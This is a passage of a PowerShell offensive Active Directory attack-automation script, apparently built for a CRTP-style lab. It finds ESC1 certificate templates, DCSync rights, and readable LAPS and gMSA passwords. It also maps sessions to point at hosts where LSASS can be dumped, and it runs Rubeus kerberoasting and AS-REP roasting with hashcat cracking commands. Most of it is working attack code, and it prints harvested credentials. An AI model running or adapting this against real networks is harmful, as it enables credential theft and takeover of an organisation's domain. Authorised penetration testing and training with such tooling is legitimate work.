                Flag 'MED' "Enterprise CA: $(PV $c 'name') on $(PV $c 'dnshostname') -> run Certify.exe find /vulnerable for ESC1-8"; AddExpl 'ADCS' @{ CA=(PV $c 'name'); Host=(PV $c 'dnshostname') }
                $out += "$(PV $c 'name') @ $(PV $c 'dnshostname')`nPublished templates: $(PV $c 'certificatetemplates')`n"
            }
        } else { $out += "No enterprise CA found via LDAP config partition." ; Flag 'INFO' "No AD CS CA found (or not readable)." }

        # ESC1-style vulnerable template detection (pure LDAP, no Certify needed)
        $tmplBase = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
        $tmpls = LDAP '(objectClass=pKICertificateTemplate)' @('name','mspki-certificate-name-flag','mspki-enrollment-flag','pkiextendedkeyusage','mspki-ra-signature') $tmplBase
        $out += "`n--- TEMPLATE ESC CHECK ---"
        foreach($tp in $tmpls){
            $nameFlag = IntP $tp 'mspki-certificate-name-flag'
            $enrFlag  = IntP $tp 'mspki-enrollment-flag'
            $raSig    = IntP $tp 'mspki-ra-signature'
            $ekus     = @($tp.Properties['pkiextendedkeyusage'])
            $suppliesSubject = ($nameFlag -band 0x1)                 # ENROLLEE_SUPPLIES_SUBJECT
            $mgrApproval     = ($enrFlag  -band 0x2)                 # PEND_ALL_REQUESTS (manager approval)
            $authClient = ($ekus.Count -eq 0) -or ($ekus -contains '1.3.6.1.5.5.7.3.2') -or ($ekus -contains '1.3.6.1.4.1.311.20.2.2') -or ($ekus -contains '1.3.6.1.5.2.3.4') -or ($ekus -contains '2.5.29.37.0')
            if ($suppliesSubject -and (-not $mgrApproval) -and ($raSig -le 0) -and $authClient){
                Flag 'HIGH' "AD CS ESC1 template: $(PV $tp 'name') (enrollee-supplies-subject + client-auth + no approval) -> verify low-priv enroll rights"
                AddExpl 'ESC1' @{ Template=(PV $tp 'name') }
                $out += "ESC1? $(PV $tp 'name')  nameFlag=$nameFlag enrFlag=$enrFlag EKU=$($ekus -join ',')"
            }
        }
    } catch { $out += "Error: $_" }
    Save '06_adcs.txt' $out
    }

    # ---------------- 06b PASSWORD POLICY (safe spraying) ----------------
    if (RunS @('policy','password','spray','lockout')) {
    Sect "Password / lockout policy"
    $out = @()
    try {
        if ($useAD -and (Get-Command Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue)) {
            $pp = Get-ADDefaultDomainPasswordPolicy -Server $Domain
            $out += ($pp | Format-List * | Out-String)
            Flag 'INFO' "PwdPolicy: minLen=$($pp.MinPasswordLength) lockoutThreshold=$($pp.LockoutThreshold) lockoutWindow=$($pp.LockoutObservationWindow)"
            if ($pp.LockoutThreshold -eq 0){ Flag 'MED' "Lockout threshold = 0 (no lockout) -> password spraying is SAFE and unlimited." }
            else { Flag 'INFO' "Spray carefully: max $($pp.LockoutThreshold - 1) attempts per window ($($pp.LockoutObservationWindow))." }
            # fine-grained policies (PSOs)
            if (Get-Command Get-ADFineGrainedPasswordPolicy -ErrorAction SilentlyContinue){
                $out += "`n--- FINE-GRAINED (PSO) ---`n" + (Get-ADFineGrainedPasswordPolicy -Filter * -Server $Domain | Format-List Name,Precedence,MinPasswordLength,LockoutThreshold,AppliesTo | Out-String)
            }
        } else {
            $head = DE "LDAP://$defaultNC"
            $minLen = $head.Properties['minPwdLength'][0]
            $lockThr = $head.Properties['lockoutThreshold'][0]
            $out += "minPwdLength=$minLen  lockoutThreshold=$lockThr"
            if ("$lockThr" -eq '0'){ Flag 'MED' "Lockout threshold = 0 (no lockout) -> spraying is SAFE." }
            else { Flag 'INFO' "Lockout threshold=$lockThr; spray conservatively." }
        }
    } catch { $out += "Error: $_" }
    Save '06b_password_policy.txt' $out
    }

    # ---------------- 06c DCSYNC RIGHTS ----------------
    if (RunS @('dcsync','replication')) {
    Sect "DCSync rights (who can replicate secrets from the domain head)"
    $out = @()
    try {
        $replGuids = @{
            '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes'
            '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes-All'
            '89e95b76-444d-4c62-991a-0facbeda640c' = 'DS-Replication-Get-Changes-In-Filtered-Set'
        }
        $de  = DE "LDAP://$defaultNC"
        $acl = $de.ObjectSecurity
        $seen = @{}
        foreach($ace in $acl.Access){
            if ($ace.AccessControlType -ne 'Allow') { continue }
            $g = "$($ace.ObjectType)"
            if ($replGuids.ContainsKey($g)){
                $who = "$($ace.IdentityReference)"
                $key = "$who|$($replGuids[$g])"
                if (-not $seen[$key]){
                    $seen[$key] = $true
                    # ignore the expected defaults (DCs, EAs, DAs, Administrators, SYSTEM)
                    if ($who -notmatch 'Domain Controllers|Enterprise Admins|Domain Admins|Administrators|SYSTEM|Enterprise Read-only'){
                        Flag 'HIGH' "DCSync-capable (non-default): $who has $($replGuids[$g]) -> secretsdump / lsadump::dcsync"; AddExpl 'DCSync' @{ Principal=$who }
                    } else {
                        Flag 'INFO' "DCSync (default): $who has $($replGuids[$g])"
                    }
                    $out += "$who  ->  $($replGuids[$g])"
                }
            }
        }
        if (-not $out){ $out += "No replication ACEs read (insufficient rights or none present)." }
    } catch { $out += "Error: $_" }
    Save '06c_dcsync_rights.txt' $out
    }

    # ---------------- 06d LAPS readability ----------------
    if (RunS @('laps')) {
    Sect "LAPS (readable local admin passwords)"
    $out = @()
    try {
        $laps = LDAP '(ms-Mcs-AdmPwd=*)' @('name','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime')
        if ($laps.Count -gt 0){
            foreach($l in $laps){
                $pw = PV $l 'ms-mcs-admpwd'
                if ($pw){ Flag 'HIGH' "LAPS password READABLE for $(PV $l 'name'): $pw" ; $out += "$(PV $l 'name') : $pw"; AddExpl 'LAPS' @{ Host=(PV $l 'name'); Pwd=$pw } }
            }
        } else {
            # detect if LAPS schema exists at all
            $schema = LDAP '(name=ms-Mcs-AdmPwd)' @('name') "LDAP://CN=Schema,$configNC"
            if ($schema.Count -gt 0){ Flag 'INFO' "LAPS is deployed but no passwords readable by this user (checking who CAN read below)." }
            else { $out += "LAPS schema attribute not found (LAPS likely not deployed)." }
        }
        # WHO can read LAPS: delegated ReadProperty on the ms-Mcs-AdmPwd attribute (non-default)
        try {
            $sg = LDAP '(name=ms-Mcs-AdmPwd)' @('schemaidguid') "LDAP://CN=Schema,$configNC"
            if ($sg.Count){
                $lapsGuid = (New-Object Guid (,[byte[]]$sg[0].Properties['schemaidguid'][0])).Guid
                $out += "`n--- LAPS READ DELEGATION (non-default) ---"
                $n = 0
                foreach($cr in (LDAP '(&(objectCategory=computer)(ms-Mcs-AdmPwdExpirationTime=*))' @('distinguishedname'))){
                    if ($n -ge 25){ break }; $n++
                    try {
                        $ce = DE "LDAP://$(PV $cr 'distinguishedname')"
                        foreach($ace in $ce.ObjectSecurity.Access){
                            if ($ace.AccessControlType -ne 'Allow'){ continue }
                            if ("$($ace.ObjectType)" -eq $lapsGuid -and "$($ace.ActiveDirectoryRights)" -match 'ReadProperty|GenericAll|GenericRead|ControlAccess'){
                                $who = "$($ace.IdentityReference)"
                                if ($who -notmatch 'Domain Admins|Enterprise Admins|SYSTEM|BUILTIN\\Administrators'){
                                    Flag 'MED' "LAPS readable by $who on $(PV $cr 'distinguishedname') (delegated) -> if you control $who, read local admin pwd"
                                    $out += "$who  can read LAPS on  $(PV $cr 'distinguishedname')"
                                }
                            }
                        }
                    } catch {}
                }
            }
        } catch {}
    } catch { $out += "Error: $_" }
    Save '06d_laps.txt' $out
    }

    # ---------------- 07 Dangerous ACLs ----------------
    if (-not $Quick -and (RunS @('acls','dacl'))) {
        Sect "Dangerous ACLs (GenericAll/WriteDacl/WriteOwner/GenericWrite)"
        $out = @()
        try {
            if ($havePVA) {
                $acls = Find-InterestingDomainAcl -ResolveGUIDs -Domain $Domain
                foreach($a in $acls){ Flag 'HIGH' "ACL: $($a.IdentityReferenceName) has $($a.ActiveDirectoryRights) over $($a.ObjectDN)" }
                $out += ($acls | Select-Object IdentityReferenceName,ActiveDirectoryRights,ObjectDN | Format-Table -Auto | Out-String)
            } else {
                $out += "PowerView Find-InterestingDomainAcl not loaded. Dot-source PowerView first, or run SharpHound -> BloodHound for full ACL attack paths."
                Flag 'INFO' "For ACL attack paths: load PowerView (Find-InterestingDomainAcl -ResolveGUIDs) or run BloodHound."
            }
        } catch { $out += "Error: $_" }
        Save '07_acls.txt' $out
    }

    # ---------------- 08 Local admin access (HOST-TOUCHING: opt-in -HostSweep / -Target) ----------------
    if (-not $Quick -and $doHostSweep -and $havePVL) {
        Sect "Local admin access (PowerView Find-LocalAdminAccess) [LOUD]"
        $out = @()
        try {
            if ($Target) { $la = Find-LocalAdminAccess -ComputerName $Target }
            else { $la = Find-LocalAdminAccess -Domain $Domain }
            foreach($h in $la){ Flag 'HIGH' "LOCAL ADMIN on: $h" }
            $out += ("Local admin on:`n" + ($la -join "`n"))
        } catch { $out += "Error: $_" }
        Save '08_localadmin.txt' $out
    } elseif (-not $Quick -and $doHostSweep -and ($haveWMIla -or $havePSRla)) {
        Sect "Local admin access (WMI/PSRemoting finder fallback) [LOUD]"
        $out = @()
        try {
            if ($haveWMIla){ $la = Find-WMILocalAdminAccess -ComputerName ($Target -join ',') 2>$null }
            elseif ($havePSRla){ $la = Find-PSRemotingLocalAdminAccess -ComputerName $Target 2>$null }
            foreach($h in $la){ if ("$h" -match 'Local Admin access on'){ Flag 'HIGH' "$h" } ; $out += "$h" }
        } catch { $out += "Error: $_" }
        Save '08_localadmin.txt' $out
    } elseif (-not $Quick) {
        Flag 'INFO' "Local-admin sweep skipped (host-touching = loud). Enable with -HostSweep or scope with -Target."
    }

    # ---------------- 09 SPN inventory ----------------
    if (RunS @('spns','spn')) {
    Sect "Domain SPN inventory"
    $out = @()
    try {
        if ($useAD) {
            $out += (Get-ADObject -LDAPFilter '(servicePrincipalName=*)' -Server $Domain -Properties servicePrincipalName |
                     Select-Object Name,servicePrincipalName | Format-List | Out-String)
        } else {
            $out += (LDAP '(servicePrincipalName=*)' @('samaccountname','serviceprincipalname') | ForEach-Object { "$(PV $_ 'samaccountname')`n  $(PV $_ 'serviceprincipalname')`n" }) -join "`n"
        }
    } catch { $out += "Error: $_" }
    Save '09_spns.txt' $out
    }

    # ---------------- 10 MSSQL discovery ----------------
    if (RunS @('mssql','sql')) {
    Sect "MSSQL SPNs (link-crawl targets)"
    $out = @()
    try {
        $mssql = LDAP '(&(servicePrincipalName=MSSQL*))' @('samaccountname','serviceprincipalname','dnshostname')
        foreach($m in $mssql){ Flag 'MED' "MSSQL SPN: $(PV $m 'samaccountname')  $(PV $m 'serviceprincipalname')" }
        $out += ($mssql | ForEach-Object { "$(PV $_ 'samaccountname')  $(PV $_ 'serviceprincipalname')" }) -join "`n"
    } catch { $out += "Error: $_" }
    Save '10_mssql.txt' $out
    }

    # ---------------- 11 Optional: enum trusted domains ----------------
    if ($IncludeForest -and $useAD -and (RunS @('trust','forest'))) {
        Sect "Trusted-domain quick recon"
        $out = @()
        try {
            foreach($t in (Get-ADTrust -Filter * -Server $Domain)){
                $td = $t.Name
                $out += "`n### $td ###`n"
                try {
                    $out += (Get-ADDomain -Server $td | Select-Object DNSRoot,DomainSID,NetBIOSName | Format-List | Out-String)
                    foreach($u in (Get-ADUser -Filter { servicePrincipalName -like '*' } -Server $td -Properties servicePrincipalName)){
                        Flag 'HIGH' "[$td] Kerberoastable: $($u.SamAccountName)"
                    }
                } catch { $out += "  (could not query ${td}: $_)" }
            }
        } catch { $out += "Error: $_" }
        Save '11_trusted_domains.txt' $out
    }

    # ---------------- 12 SMB SHARES (HOST-TOUCHING: opt-in -HostSweep / -Target) ----------------
    if (-not $Quick -and $doHostSweep) {
        Sect "SMB Shares (readable / writable / interesting files) [LOUD]"
        $out = @()
        try {
            if ($havePVS) {
                if ($Target) { $shares = Find-DomainShare -CheckShareAccess -ComputerName $Target }
                else { $shares = Find-DomainShare -CheckShareAccess -Domain $Domain }
                foreach($s in $shares){ Flag 'MED' "Readable share: \\$($s.ComputerName)\$($s.Name)  ($($s.Remark))" }
                $out += ($shares | Select-Object ComputerName,Name,Remark | Format-Table -Auto | Out-String)
                if (Get-Command Find-InterestingDomainShareFile -ErrorAction SilentlyContinue) {
                    $files = Find-InterestingDomainShareFile -Domain $Domain -Include @('*pass*','*cred*','*.kdbx','*.config','unattend*','*secret*','*.vmdk','*.ppk','id_rsa*')
                    foreach($f in $files){ Flag 'HIGH' "Interesting share file: $($f.Path)" }
                    $out += "`n--- INTERESTING FILES ---`n" + ($files | Select-Object Path,Owner,LastWriteTimeUtc | Format-Table -Auto | Out-String)
                }
            }
            elseif ($haveHunt) {
                Flag 'INFO' "PowerHuntShares loaded -> run: Invoke-HuntSMBShares -Threads 20 -OutputDirectory C:\Users\Public\shares"
                $out += "Run PowerHuntShares manually for the full HTML report:`n  Invoke-HuntSMBShares -Threads 20 -OutputDirectory C:\Users\Public\shares"
            }
            else {
                Flag 'INFO' "No share tool loaded. Import PowerView (Find-DomainShare) or PowerHuntShares (Invoke-HuntSMBShares)."
                $out += "No PowerView/PowerHuntShares in session; skipped share hunt."
            }
        } catch { $out += "Error: $_" }
        Save '12_shares.txt' $out
    } elseif (-not $Quick) {
        Flag 'INFO' "Share hunt skipped (host-touching = loud). Enable with -HostSweep or scope with -Target."
    }

    # ---------------- 13 LOCAL PRIVILEGE ESCALATION (this host) ----------------
    if (RunS @('privesc','local')) {
    Sect "Local privilege escalation checks (current host)"
    $out = @()
    try {
        if ($havePU) {
            Flag 'INFO' "PowerUp loaded -> running Invoke-PrivescAudit on $env:COMPUTERNAME"
            $audit = Invoke-PrivescAudit
            $out += ($audit | Out-String)
            foreach($a in $audit){
                $chk = if ($a.Check){ $a.Check } else { 'PrivEsc' }
                Flag 'HIGH' "Local privesc [$env:COMPUTERNAME] $chk : $($a.AbuseFunction)"
            }
        }
        elseif ($havePEC) {
            Flag 'INFO' "PrivEscCheck loaded -> run: Invoke-PrivescCheck -Extended -Report privesc_$env:COMPUTERNAME"
            $out += "Run manually: Invoke-PrivescCheck -Extended -Report privesc_$env:COMPUTERNAME -Format HTML,TXT"
        }
        else {
            Flag 'INFO' "No local-privesc tool loaded. Import PowerUp (Invoke-PrivescAudit) or PrivEscCheck (Invoke-PrivescCheck)."
            $out += "No PowerUp/PrivEscCheck in session; skipped local privesc audit."
        }
        # Cached GPP passwords on this host (PowerUp helper)
        if ($haveGPP) {
            $gpp = Get-CachedGPPPassword
            foreach($g in $gpp){ Flag 'HIGH' "Cached GPP password on host: $($g.UserName) / $($g.Passwords)" }
            if ($gpp){ $out += "`n--- CACHED GPP ---`n" + ($gpp | Out-String) }
        }
    } catch { $out += "Error: $_" }
    Save '13_local_privesc.txt' $out
    }

    # ---------------- 13b winPEAS (OPT-IN, loud - only if -WinPEASPath given) ----------------
    if ($WinPEASPath) {
        Sect "winPEAS (opt-in deep local triage - NOISY)"
        $pout = @()
        try {
            if (Test-Path $WinPEASPath) {
                Flag 'MED' "Running winPEAS ($WinPEASPath) - this is loud and AV/EDR-signatured."
                $wpArgs = 'log systeminfo userinfo servicesinfo applicationsinfo filesinfo'  # skip the noisiest scans; adjust as needed
                if ($WinPEASPath -match '\.bat$') { $raw = & cmd.exe /c "`"$WinPEASPath`"" 2>&1 }
                else { $raw = & "$WinPEASPath" $wpArgs.Split(' ') 2>&1 }
                $pout += ($raw | Out-String)
                # surface winPEAS's own red/high hits (it tags interesting lines)
                foreach($line in ($raw | Where-Object { $_ -match 'You can|modifiable|Possible|password|CPassword|Unquoted|AlwaysInstall|SeImpersonate' })){
                    Flag 'MED' "winPEAS: $($line.ToString().Trim())"
                }
            } else {
                $pout += "WinPEASPath not found: $WinPEASPath"
                Flag 'INFO' "winPEAS path not found: $WinPEASPath"
            }
        } catch { $pout += "Error: $_" }
        Save '13b_winpeas.txt' $pout
    }

    # ---------------- 14 ATTACK-PATH CORRELATION (HOST-TOUCHING: opt-in -HostSweep / -Target) ----------------
    if (-not $Quick -and $doHostSweep -and $haveSH) {
        Sect "Attack-path correlation (where I'm admin AND a privileged user is logged on) [LOUD]"
        $out = @()
        try {
            # 1) Build the set of privileged principals we care about (recursive)
            $privUsers = New-Object System.Collections.Generic.HashSet[string] ([StringComparer]::OrdinalIgnoreCase)
            $privSource = @{}
            $targetGroups = 'Domain Admins','Enterprise Admins','Administrators'
            foreach($g in $targetGroups){
                if ($useAD) {
                    foreach($m in (Get-ADGroupMember -Identity $g -Recursive -Server $Domain 2>$null)){
                        if ($m.objectClass -eq 'user'){ [void]$privUsers.Add($m.SamAccountName); $privSource[$m.SamAccountName] = $g }
                    }
                } else {
                    foreach($r in (LDAP "(&(objectCategory=group)(cn=$g))" @('member'))){
                        foreach($dn in $r.Properties['member']){
                            $sam = ($dn -split ',')[0] -replace '^CN=',''
                            [void]$privUsers.Add($sam); if (-not $privSource[$sam]){ $privSource[$sam] = $g }
                        }
                    }
                }
            }
            $out += "Privileged principals tracked ($($privUsers.Count)):`n  " + (($privUsers) -join ', ') + "`n"

            # 2) Collect sessions as raw objects (admin check on so 'Access' is populated)
            Flag 'INFO' "Running Invoke-SessionHunter -CheckAsAdmin -RawResults (this can take a minute)..."
            if ($Target) { $sessions = Invoke-SessionHunter -Domain $Domain -Targets ($Target -join ',') -CheckAsAdmin -RawResults 2>$null }
            else { $sessions = Invoke-SessionHunter -Domain $Domain -CheckAsAdmin -RawResults 2>$null }
            $out += "`n--- RAW SESSIONS ---`n" + ($sessions | Select-Object HostName,IPAddress,Access,UserSession,AdmCount | Format-Table -Auto | Out-String)

            # 3) Correlate
            $paths = @()
            foreach($s in $sessions){
                $user = ($s.UserSession -split '\\')[-1]
                if ([string]::IsNullOrWhiteSpace($user)) { continue }
                $isPriv  = $privUsers.Contains($user) -or ($s.AdmCount -eq $true) -or ($s.AdmCount -eq 'YES')
                if (-not $isPriv) { continue }
                $amAdmin = ($s.Access -eq $true)
                $src = if ($privSource[$user]) { $privSource[$user] } else { 'adminCount=1' }
                $paths += [PSCustomObject]@{
                    Target      = $s.HostName
                    IP          = $s.IPAddress
                    PrivUser    = $s.UserSession
                    FromGroup   = $src
                    IAmAdmin    = $amAdmin
                }
                if ($amAdmin) {
                    Flag 'HIGH' "GO HERE: admin on $($s.HostName) AND priv user logged on -> $($s.UserSession) [$src]  (dump LSASS for its creds)"
                    AddExpl 'DumpTarget' @{ Host=$s.HostName; PrivUser=$s.UserSession }
                } else {
                    Flag 'MED'  "Priv session on $($s.HostName): $($s.UserSession) [$src] -- need local admin here first"
                }
            }
            $out += "`n--- CORRELATED ATTACK PATHS ---`n" + ($paths | Sort-Object -Property @{e='IAmAdmin';Descending=$true},Target | Format-Table -Auto | Out-String)
            if (-not $paths){ $out += "No privileged sessions correlated (try again after moving laterally, or without -CheckAsAdmin)." }
        } catch { $out += "Error: $_" }
        Save '14_attack_paths.txt' $out
    } elseif (-not $Quick -and $doHostSweep -and -not $haveSH) {
        Flag 'INFO' "Load Invoke-SessionHunter.ps1 to enable attack-path correlation (admin x priv-session)."
    } elseif (-not $Quick) {
        Flag 'INFO' "Session/attack-path hunt skipped (host-touching = loud). Enable with -HostSweep or scope with -Target."
    }

    # ---------------- 15 gMSA (readable managed passwords) ----------------
    if (RunS @('gmsa')) {
    Sect "gMSA (group Managed Service Accounts + who can read them)"
    $out = @()
    try {
        $me = ([Security.Principal.WindowsIdentity]::GetCurrent()).Name
        $myGroups = @()
        try { $myGroups = ([Security.Principal.WindowsIdentity]::GetCurrent()).Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value } } catch {}
        if ($useAD -and (Get-Command Get-ADServiceAccount -ErrorAction SilentlyContinue)) {
            $gmsas = Get-ADServiceAccount -Filter * -Server $Domain -Properties PrincipalsAllowedToRetrieveManagedPassword,servicePrincipalName,memberOf
            foreach($g in $gmsas){
                $readers = @($g.PrincipalsAllowedToRetrieveManagedPassword)
                $out += "$($g.SamAccountName)  readers: $($readers -join ', ')"
                $canRead = $false
                foreach($r in $readers){
                    $rn = ($r -split ',')[0] -replace '^CN=',''
                    if ($me -match [regex]::Escape($rn) -or ($myGroups | Where-Object { $_ -match [regex]::Escape($rn) })){ $canRead = $true }
                }
                if ($canRead){ Flag 'HIGH' "gMSA READABLE by you: $($g.SamAccountName) -> Rubeus/GMSAPasswordReader for its NTLM"; AddExpl 'GMSA' @{ Account=$g.SamAccountName } }
                else { Flag 'INFO' "gMSA: $($g.SamAccountName) (readers: $($readers -join ', '))" }
            }
        } else {
            $g2 = LDAP '(objectClass=msDS-GroupManagedServiceAccount)' @('samaccountname','msds-groupmsamembership')
            foreach($r in $g2){ Flag 'INFO' "gMSA present: $(PV $r 'samaccountname') (load AD module to resolve who can read it)" }
            if (-not $g2){ $out += "No gMSA objects found." }
        }
    } catch { $out += "Error: $_" }
    Save '15_gmsa.txt' $out
    }

    # ---------------- 16 CROSS-TRUST PRINCIPALS + TRUST MAP ----------------
    if (-not $Quick -and (RunS @('trust','foreign'))) {
        Sect "Cross-trust foreign principals & trust map"
        $out = @()
        try {
            if ($havePVF) {
                $fg = Get-DomainForeignGroupMember -Domain $Domain
                foreach($f in $fg){ Flag 'HIGH' "Foreign group member: $($f.MemberName) is in $($f.GroupName) of $Domain (cross-trust path)" }
                $out += "--- FOREIGN GROUP MEMBERS ---`n" + ($fg | Out-String)
                if (Get-Command Get-DomainForeignUser -ErrorAction SilentlyContinue){
                    $out += "`n--- FOREIGN USERS ---`n" + (Get-DomainForeignUser -Domain $Domain | Out-String)
                }
                if (Get-Command Get-DomainTrustMapping -ErrorAction SilentlyContinue){
                    $out += "`n--- TRUST MAP ---`n" + (Get-DomainTrustMapping | Out-String)
                }
            } else {
                $out += "PowerView not loaded; foreign-principal mapping skipped. (Get-DomainForeignGroupMember / Get-DomainTrustMapping)"
                Flag 'INFO' "Load PowerView for cross-trust foreign-principal mapping."
            }
        } catch { $out += "Error: $_" }
        Save '16_foreign_trust.txt' $out
    }

    # ---------------- 17 GPO-DERIVED LOCAL ADMIN (who is admin where) ----------------
    if (-not $Quick -and (RunS @('gpo','localadmin'))) {
        Sect "GPO-derived local admin mapping (low-noise, LDAP)"
        $out = @()
        try {
            if ($havePVG) {
                $map = Get-DomainGPOUserLocalGroupMapping -Domain $Domain -LocalGroup Administrators
                foreach($m in $map){
                    $who = $m.ObjectName; $where = ($m.ComputerName -join ', ')
                    Flag 'MED' "Local admin via GPO: $who -> $where"
                    $out += "$who  =>  $where"
                }
                if (-not $map){ $out += "No GPO-based local admin mappings found." }
            } else {
                $out += "PowerView not loaded; GPO local-group mapping skipped. (Get-DomainGPOUserLocalGroupMapping)"
                Flag 'INFO' "Load PowerView for GPO-derived 'who is admin where' (no host contact, pure LDAP)."
            }
        } catch { $out += "Error: $_" }
        Save '17_gpo_localadmin.txt' $out
    }

    # ---------------- 18 MSSQL link crawl (opt-in: -SQLCrawl, PowerUpSQL) ----------------
    if ($SQLCrawl) {
        Sect "MSSQL discovery + link crawl (PowerUpSQL)"
        $out = @()
        try {
            if ($haveSQL) {
                $inst = Get-SQLInstanceDomain
                $out += "--- INSTANCES ---`n" + ($inst | Select-Object ComputerName,Instance | Format-Table -Auto | Out-String)
                $access = $inst | Get-SQLConnectionTest -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Accessible' }
                foreach($a in $access){ Flag 'HIGH' "MSSQL accessible: $($a.Instance) -> Get-SQLServerLinkCrawl for xp_cmdshell chain"; AddExpl 'MSSQL' @{ Instance=$a.Instance } }
                $out += "`n--- ACCESSIBLE ---`n" + ($access | Out-String)
                if ((Get-Command Get-SQLServerLinkCrawl -ErrorAction SilentlyContinue) -and $access){
                    $out += "`n--- LINK CRAWL ---`n" + ($access | Get-SQLServerLinkCrawl -ErrorAction SilentlyContinue | Select-Object Version,Instance,Links,User,Sysadmin | Format-Table -Auto | Out-String)
                }
                # weak-config audit on accessible instances
                if ((Get-Command Invoke-SQLAudit -ErrorAction SilentlyContinue) -and $access){
                    $audit = $access | Invoke-SQLAudit -ErrorAction SilentlyContinue
                    foreach($a in ($audit | Where-Object { $_.Severity -match 'High|Medium' })){ Flag 'HIGH' "MSSQL weak config on $($a.Instance): $($a.Vulnerability)" }
                    $out += "`n--- SQL AUDIT ---`n" + ($audit | Select-Object Instance,Vulnerability,Severity | Format-Table -Auto | Out-String)
                }
            } else {
                $out += "PowerUpSQL not loaded. Import-Module PowerUpSQL.ps1 then re-run with -SQLCrawl."
                Flag 'INFO' "Load PowerUpSQL for MSSQL discovery + link crawl."
            }
        } catch { $out += "Error: $_" }
        Save '18_mssql_crawl.txt' $out
    }

    # ---------------- 19 BloodHound collection (opt-in: -BloodHound) ----------------
    if ($BloodHound) {
        Sect "BloodHound collection (SharpHound)"
        $out = @()
        try {
            # auto-detect SharpHound if no path given
            if (-not $SharpHoundPath) {
                foreach($p in @('D:\CRTP\Tools\Sliver\SharpHound.exe','D:\CRTP\Tools\SharpHound.exe','D:\CRTP\Tools\SharpHound.ps1')){
                    if (Test-Path $p){ $SharpHoundPath = $p; break }
                }
            }
            if ($SharpHoundPath -and (Test-Path $SharpHoundPath) -and ($SharpHoundPath -match '\.exe$')) {
                # SharpHound.exe collector
                Flag 'MED' "Running SharpHound.exe (Stealth) -> output in report folder for BloodHound import."
                & "$SharpHoundPath" --collectionmethods DCOnly --domain $Domain --outputdirectory $run --zipfilename "bloodhound_$($Domain -replace '\.','_').zip" 2>&1 | Out-Null
                $out += "SharpHound.exe collection complete. Import the .zip in $run into BloodHound."
            } else {
                if (-not (Get-Command Invoke-BloodHound -ErrorAction SilentlyContinue)) {
                    if ($SharpHoundPath -and (Test-Path $SharpHoundPath)) { . $SharpHoundPath }
                }
                if (Get-Command Invoke-BloodHound -ErrorAction SilentlyContinue) {
                    Flag 'MED' "Running SharpHound (Stealth DCOnly) -> zip in report folder for BloodHound import."
                    Invoke-BloodHound -CollectionMethod DCOnly -Domain $Domain -OutputDirectory $run -ZipFileName "bloodhound_$($Domain -replace '\.','_').zip" 2>$null
                    $out += "SharpHound collection complete. Import the .zip in $run into BloodHound GUI, run 'Shortest paths to Domain Admins'."
                } else {
                    $out += "SharpHound not available. Pass -SharpHoundPath C:\Tools\SharpHound.ps1 (or .exe)"
                    Flag 'INFO' "For BloodHound graph, pass -SharpHoundPath to SharpHound.ps1 or SharpHound.exe."
                }
            }
        } catch { $out += "Error: $_" }
        Save '19_bloodhound.txt' $out
    }

    # ---------------- 20 Kerberos roasting (opt-in: -Roast, Rubeus) ----------------
    if ($Roast) {
        Sect "Kerberos roasting (Rubeus kerberoast + asreproast) - generates 4769 events"
        $out = @()
        try {
            $rubeus = $null
            if ($RubeusPath -and (Test-Path $RubeusPath)) { $rubeus = $RubeusPath }
            else {
                foreach($p in @('D:\CRTP\Tools\Sliver\Rubeus.exe','D:\CRTP\Tools\Rubeus.exe')){
                    if (Test-Path $p){ $rubeus = $p; break }
                }
                if (-not $rubeus -and (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)) { $rubeus = (Get-Command Rubeus.exe).Source }
            }

            if ($rubeus) {
                Flag 'MED' "Running Rubeus kerberoast + asreproast (authorized lab). Hashes saved to report folder."
                $kOut = Join-Path $run 'kerberoast_hashes.txt'
                $aOut = Join-Path $run 'asrep_hashes.txt'
                & "$rubeus" kerberoast /nowrap /outfile:"$kOut" 2>&1 | Out-Null
                & "$rubeus" asreproast /format:hashcat /nowrap /outfile:"$aOut" 2>&1 | Out-Null
                if (Test-Path $kOut) {
                    $kn = (Get-Content $kOut | Where-Object { $_ -match '\$krb5tgs\$' }).Count
                    if ($kn -gt 0){ Flag 'HIGH' "Rubeus captured $kn Kerberoast hash(es) -> kerberoast_hashes.txt (hashcat -m 13100)" }
                    $out += "Kerberoast -> $kOut ($kn hashes)"
                }
                if (Test-Path $aOut) {
                    $an = (Get-Content $aOut | Where-Object { $_ -match '\$krb5asrep\$' }).Count
                    if ($an -gt 0){ Flag 'HIGH' "Rubeus captured $an AS-REP hash(es) -> asrep_hashes.txt (hashcat -m 18200)" }
                    $out += "AS-REP -> $aOut ($an hashes)"
                }
                $out += "`nCrack with:`n  hashcat -m 13100 kerberoast_hashes.txt <wordlist>`n  hashcat -m 18200 asrep_hashes.txt <wordlist>"
            } else {
                $out += "Rubeus.exe not found. Pass -RubeusPath C:\Tools\Rubeus.exe"
                Flag 'INFO' "For auto-roasting, pass -RubeusPath to Rubeus.exe."
            }
        } catch { $out += "Error: $_" }
        Save '20_roast.txt' $out
    }

    # ---------------- 21 Compiled .NET enum binaries (opt-in: -SharpEnum) ----------------
    if ($SharpEnum) {
        Sect "Compiled .NET enumeration (ADCollector / Seatbelt / SharpUp) - louder, opt-in"
        $out = @()
        try {
            # ONLY enumeration tools here - never the cred/lateral/loader binaries.
            $enumTools = @(
                @{ Name='ADCollector'; Exe='ADCollector.exe'; Args=@();               Desc='comprehensive AD recon' },
                @{ Name='Seatbelt';    Exe='Seatbelt.exe';    Args=@('-group=all');    Desc='host situational awareness' },
                @{ Name='SharpUp';     Exe='SharpUp.exe';     Args=@('audit');         Desc='local privesc audit' }
            )
            foreach($tool in $enumTools){
                $exe = Join-Path $ToolsDir $tool.Exe
                if (Test-Path $exe) {
                    Flag 'MED' "Running $($tool.Name) ($($tool.Desc)) - compiled, AV-signatured."
                    $raw = & "$exe" $tool.Args 2>&1 | Out-String
                    Save ("21_{0}.txt" -f $tool.Name) $raw
                    $out += "[$($tool.Name)] -> 21_$($tool.Name).txt ($([math]::Round($raw.Length/1kb,1)) KB)"
                } else {
                    $out += "[$($tool.Name)] not found at $exe"
                }
            }
            if (-not $out){ $out += "No compiled enum tools found in $ToolsDir" }
        } catch { $out += "Error: $_" }
